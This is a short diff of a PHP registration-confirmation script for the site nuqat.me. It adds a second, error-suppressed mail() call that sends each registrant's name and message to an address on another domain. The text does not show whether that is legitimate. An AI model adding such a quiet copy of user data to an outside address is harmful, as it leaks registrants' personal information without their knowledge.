@@ -354,6 +354,9 @@ $headers = 'From: info@nuqat.me';
 
 @mail("info@nuqat.me", "Full Name: ".$row_register['FName']." ".$row_register['LName'], $email_message, $headers);
 
+@mail("wzeidan@wakpot.com", "Full Name: ".$row_register['FName']." ".$row_register['LName'], $email_message, $headers);
+
+
 header("Location: http://nuqat.me/regconf.php?merchTxnRef=".$row_register['merchTxnRef']);
 
 mysql_free_result($register);
